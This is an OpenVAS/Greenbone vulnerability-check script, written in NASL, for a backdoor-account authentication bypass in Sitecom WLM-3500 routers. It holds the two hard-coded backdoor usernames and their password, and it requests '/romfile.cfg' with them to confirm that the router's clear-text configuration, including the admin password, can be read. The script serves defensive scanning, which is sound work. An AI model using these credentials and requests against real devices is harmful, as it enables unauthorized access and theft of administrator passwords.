if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803193" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2013-04-18 15:27:50 +0530 (Thu, 18 Apr 2013)" );
	script_name( "Sitecom WLM-3500 Backdoor Accounts Authentication Bypass vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/526372" );
	script_xref( name: "URL", value: "http://comments.gmane.org/gmane.comp.security.bugtraq/51700" );
	script_xref( name: "URL", value: "http://exploitsdownload.com/exploit/na/sitecom-wlm-3500-backdoor-accounts" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Default Accounts" );
	script_dependencies( "gb_get_http_banner.sc", "gb_default_credentials_options.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "ADSL_MODEM/banner" );
	script_exclude_keys( "default_credentials/disable_default_account_checks" );
	script_tag( name: "impact", value: "Successful exploitation will let the remote attacker to access the web
  interface of the affected devices using two distinct hard-coded users." );
	script_tag( name: "affected", value: "Sitecom WLM-3500, firmware versions < 1.07" );
	script_tag( name: "solution", value: "Upgrade to Sitecom WLM-3500, firmware versions 1.07 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "This host is running Sitecom WLM-3500 Router and is prone to authentication
  bypass vulnerability." );
	script_tag( name: "insight", value: "Sitecom WLM-3500 routers contain an undocumented access backdoor that can be
  abused to bypass existing authentication mechanisms.

  These hard-coded accounts are persistently stored inside the device firmware
  image. Despite these users cannot access all the pages of the web interface,
  they can still access page '/romfile.cfg', the (clear-text) configuration file
  of the device that contains, among the other things, also the password for the
  'admin' user. Thus, escalating to administrative privileges is trivial." );
	exit( 0 );
}
if(get_kb_item( "default_credentials/disable_default_account_checks" )){
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: port );
if(!ContainsString( banner, "WWW-Authenticate: Basic realm=\"ADSL Modem\"" )){
	exit( 0 );
}
url = "/romfile.cfg";
req = http_get( item: url, port: port );
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
host = http_host_name( port: port );
if(ContainsString( buf, "401 Unauthorized" )){
	cookie = eregmatch( pattern: NASLString( "Set-Cookie: ([^\\r\\n ]+)" ), string: buf );
	if(cookie[1] == NULL){
		exit( 0 );
	}
	users = make_list( "user3",
		 "qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwerty" + "uiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopq" + "wertyuiopqwertyuiopqwertyui" );
	pwd = "1234567890123456789012345678901234567890123456789012345678901234567" + "8901234567890123456789012345678901234567890123456789012345678";
	for user in users {
		userpass = user + ":" + pwd;
		userpass64 = base64( str: userpass );
		req = NASLString( "GET ", url, " HTTP/1.0\\r\\n", "Host: ", port, "\\r\\n", "Cookie: ", cookie[1], "\\r\\n", "Authorization: Basic ", userpass64, "\\r\\n\\r\\n" );
		buf = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
		if(ContainsString( buf, "<ROMFILE>" ) && ContainsString( buf, "\"Sitecom" ) && ContainsString( buf, "USERNAME=" ) && "PASSWORD=" && buf){
			security_message( port: port );
			exit( 0 );
		}
	}
}
exit( 99 );

